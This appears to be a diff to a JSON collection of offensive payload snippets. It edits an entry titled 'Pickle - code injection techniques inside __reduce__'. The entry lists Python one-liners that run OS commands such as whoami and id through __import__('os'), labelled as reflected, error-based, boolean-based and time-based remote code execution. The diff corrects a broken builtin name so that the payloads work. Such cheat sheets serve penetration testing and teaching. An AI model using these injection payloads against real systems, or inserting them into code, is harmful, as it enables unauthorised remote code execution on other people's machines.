@@ -391,7 +391,7 @@
       "title": "Pickle - code injection techniques inside __reduce__",
       "language": "python",
       "tags": ["python", "pickle", "rce", "blind"],
-      "body": "__import__('os').system('whoami') # Reflected RCE\ngetattr('', __import__('os').popen('whoami').read()) # Error-Based RCE\n1 / (__include__(\"os\").popen(\"id\")._proc.wait() == 0) # Boolean-Based RCE\n__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE"
+      "body": "__import__('os').system('whoami') # Reflected RCE\ngetattr('', __import__('os').popen('whoami').read()) # Error-Based RCE\n1 / (__import__(\"os\").popen(\"id\")._proc.wait() == 0) # Boolean-Based RCE\n__import__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE"
     },
     {
       "subcategory": "Python",
